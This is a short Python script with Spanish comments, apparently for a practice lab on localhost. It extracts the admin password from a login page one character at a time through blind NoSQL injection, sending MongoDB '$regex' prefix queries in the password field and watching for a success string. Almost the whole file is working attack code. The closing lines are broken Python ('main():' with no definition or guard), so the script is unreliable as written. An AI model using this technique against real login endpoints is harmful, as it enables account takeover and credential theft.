```python
#!/usr/bin/python3

# Importamos las bibliotecas necesarias
from pwn import *  # Librería para interactuar con programas
import requests  # Librería para hacer peticiones HTTP
import time  # Librería para trabajar con tiempos
import sys  # Librería para interactuar con el sistema
import signal  # Librería para manejar señales
import string  # Librería para trabajar con cadenas de caracteres

# Función que maneja la señal SIGINT (Control + C)
def saliendo(sig, frame):
    print('\n\n[+] Saliendo...\n\n')
    sys.exit(1)

# Capturamos la señal SIGINT y la manejamos con la función "saliendo"
signal.signal(signal.SIGINT, saliendo)

# URL de la página de login
login_url = "http://localhost:4000/user/login"

# Definimos los caracteres a probar (letras minúsculas, mayúsculas y dígitos)
caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits

# Función para realizar una inyección NoSQL
def nosqli():
    password = ""  # Almacenamos la contraseña a medida que la descubrimos

    # Creamos una barra de progreso para la fuerza bruta
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ...")  # Mostramos un mensaje inicial

    time.sleep(2)  # Esperamos 2 segundos para dar tiempo al usuario

    # Creamos otra barra de progreso para mostrar la contraseña
    p2 = log.progress("Password")

    # Iteramos a través de las posiciones en la contraseña (hasta 24 caracteres)
    for posicion in range(0, 24):
        for caracter in caracteres:  # Probamos cada caracter en la posición actual
            # Creamos los datos del POST con el caracter actual y la contraseña parcial
            post_data = {
                "username": "admin",
                "password": {"$regex": "^%s%s" % (password, caracter)}
            }

            p1.status(post_data)  # Mostramos los datos del POST en la barra de progreso

            headers = {'Content-Type': 'application/json'}  # Encabezados para la solicitud
            respuesta = requests.post(login_url, headers=headers, json=post_data)  # Realizamos la solicitud POST

            # Si encontramos la cadena "Logged in as user" en la respuesta, hemos adivinado un caracter correcto
            if "Logged in as user" in respuesta.text:
                password += caracter  # Agregamos el caracter a la contraseña
                p2.status(password)  # Mostramos la contraseña actual en la barra de progreso
                break  # Salimos del bucle interno, ya que hemos encontrado el caracter correcto

main():
    nosqli()  # Ejecutamos la función "nosqli" si el script se ejecuta directamente


